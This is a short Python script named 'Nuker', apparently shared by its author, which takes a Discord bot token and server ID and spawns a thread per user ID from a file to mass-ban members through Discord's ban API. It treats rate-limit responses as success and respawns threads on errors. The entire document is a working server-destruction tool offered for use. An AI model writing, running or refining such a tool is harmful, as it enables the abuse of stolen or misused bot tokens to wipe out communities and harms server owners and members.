"""
-> Created by float#8504
"""
import os, requests, threading, random, time

class Nuker:

    def __init__(self):

        print("-> Token; ", end="")
        self.Token = str(input()).strip()

        print("-> Guild ID; ", end="")
        self.Guild = int(input())

        self.Clear = lambda: os.system("cls; clear")

        self.Clear()

        self.Lock = threading.Lock()
        
        self.Request_Headers = {"Authorization": "Bot {}".format(self.Token)}

        self.Api = random.randint(6, 9)

        self.Users = []

        self.Session = requests.Session()

    
    def Send_Request(self, user: str):
        try:
            response = self.Session.put(
                "https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.Api, self.Guild, user),
                headers = self.Request_Headers,
                json = {
                    "reason": "float#8504"
                }
            )
            if response.status_code in [200, 201, 204, 429]:
                pass # <- Somehow, printing would make the program more "slower" so i didnt use it here and used an null operation instead.
            else:
                json = response.json()
                self.Lock.acquire()
                print("-> Error; {}".format(json["message"]))
                self.Lock.release()             
        except (Exception):
            return(threading.Thread(target=self.Send_Request, args=(user, )).start())


    def Start_Workers(self):

        print("-> Starting all workers.")
        
        for user in open("data/users.txt").read().splitlines():
            self.Users.append(user)
        
        for user in self.Users:
            threading.Thread(target=self.Send_Request, args=(user, )).start()

        print("-> Workers finished."); time.sleep(3); os._exit(0)


if __name__ == "__main__":  Nuker().Start_Workers()
